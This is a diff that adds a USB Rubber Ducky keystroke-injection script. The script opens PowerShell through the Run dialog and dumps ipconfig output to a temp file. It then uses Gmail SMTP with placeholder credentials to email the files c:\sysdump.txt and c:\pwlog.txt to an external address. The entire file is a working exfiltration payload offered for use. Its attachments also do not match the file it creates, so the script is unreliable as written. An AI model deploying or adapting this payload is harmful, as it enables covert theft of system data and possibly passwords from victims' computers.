@@ -1,0 +1,66 @@
+DELAY 10000
+GUI r
+DELAY 250
+REM Elevated PS: STRING powershell Start-Process powershell -Verb runAs
+REM Standard PS: STRING powershell Start-Process powershell
+STRING powershell Start-Process powershell
+ENTER
+DELAY 3000
+REM ALT y
+REM DELAY 200
+REM Run ipconfig and dump to file
+STRING ipconfig /all >AppData\Local\Temp\ipconfig.txt
+ENTER
+REM email the ipconfig.txt to your email
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+DELAY 250
+ENTER
+DELAY 1000
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+DELAY 250
+ENTER
+DELAY 1000
+STRING $SMTPInfo.EnableSsl = $true
+DELAY 250
+ENTER
+DELAY 1000
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('user@gmail.com', 'password');
+DELAY 250
+ENTER
+DELAY 1000
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+DELAY 250
+ENTER
+DELAY 1000
+STRING $ReportEmail.From = 'user@gmail.com'
+DELAY 250
+ENTER
+DELAY 1000
+STRING $ReportEmail.To.Add('user@gmail.com')
+DELAY 250
+ENTER
+DELAY 1000
+STRING $ReportEmail.Subject = 'Hello from the ducky'
+DELAY 250
+ENTER
+DELAY 1000
+DELAY 250
+STRING $ReportEmail.Body = 'Attached is your duck report.'
+DELAY 250
+ENTER
+DELAY 1000
+STRING $ReportEmail.Attachments.Add('c:\sysdump.txt')
+DELAY 250
+ENTER
+DELAY 1000
+STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
+DELAY 250
+ENTER
+DELAY 1000
+STRING $SMTPInfo.Send($ReportEmail)
+DELAY 250
+ENTER
+DELAY 4000
+STRING exit
+ENTER
